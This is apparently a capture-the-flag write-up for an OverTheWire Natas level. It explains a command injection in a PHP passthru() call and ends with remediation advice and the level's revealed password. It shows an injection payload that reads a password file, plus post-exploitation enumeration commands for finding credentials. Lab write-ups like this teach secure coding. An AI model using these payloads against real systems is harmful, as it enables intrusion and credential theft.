#### Summary
Unsanitized user input was passed directly to a shell command, allowing arbitrary command execution (**Command Injection**).
#### Target
The `needle` query parameter, which is concatenated into a command executed by `passthru()`.
#### Exploit
1. Inspect the source code.
2. Identify the vulnerable line:
```php
    passthru("grep -i $key dictionary.txt");
```
3. Inject a shell command separator (`;`) followed by another command.
4. Read the password file.
#### Payloads / Commands
```text
; cat /etc/natas_webpass/natas10
```
The resulting command becomes:
```bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
```
#### Why it works
`passthru()` executes the constructed string through the system shell. Since user input is concatenated without validation or escaping, shell metacharacters such as `;` are interpreted as command separators, allowing arbitrary commands to be executed.
#### Real-World Notes
After confirming Command Injection, a real penetration test would typically continue with **enumeration** before targeting sensitive files.
Common commands include:
- `pwd` — Print the current working directory.
- `ls -la` — List files, including hidden ones.
- `whoami` — Display the current user.
- `id` — Show user and group identifiers.
- `env` — Display environment variables.
- [[find]] — Search the filesystem for configuration files, credentials, backups, scripts, or other interesting targets.
> Natas exposes the password location as part of the challenge (`/etc/natas_webpass/`). In a real-world scenario, discovering valuable files is usually part of the assessment.
#### Takeaways
- Never concatenate user input into shell commands.
- Validate and sanitize all external input.
- Prefer safe APIs that avoid invoking the shell whenever possible.
- Command Injection often leads to Remote Code Execution (RCE).
#### Pass 10
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv